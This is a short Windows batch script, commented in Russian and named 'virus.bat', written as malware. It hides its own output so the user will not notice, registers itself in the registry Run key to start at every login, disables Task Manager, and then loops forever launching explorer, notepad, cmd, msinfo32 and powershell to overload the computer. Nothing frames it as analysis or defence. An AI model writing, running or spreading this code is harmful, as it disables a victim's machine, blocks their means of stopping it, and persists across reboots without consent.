:: (Скрывает вывод комманд в консоль/терминал, чтобы пользователь ничего не заподозрил)
@echo off

:: (Проверка существования автозапуска в реестре)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" >nul 2>&1

:: (Проверка ошибок, и когда автозапуск отсутствует он добавлятся)
if %errorlevel% == 0 (
    goto :end
) else (
    :: (Переменные)
    set "filename=virus.bat"
    set "desktop=%USERPROFILE%\Desktop"
    set "downloads=%USERPROFILE%\Downloads"

    :: (Проверяем рабочий стол)
    if exist "%desktop%\%filename%" (
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%desktop%\%filename%" /f
        goto :end
    )

    :: (Проверяем загрузки)
    if exist "%downloads%\%filename%" (
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
    )
)

:end

:: (Запрет открытия диспетчера задач)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f

:: (Нагрузка на ПК постоянным открытием системных программ)
:forever
start explorer.exe
start notepad.exe
start cmd.exe
start msinfo32.exe
start powershell.exe
goto :forever
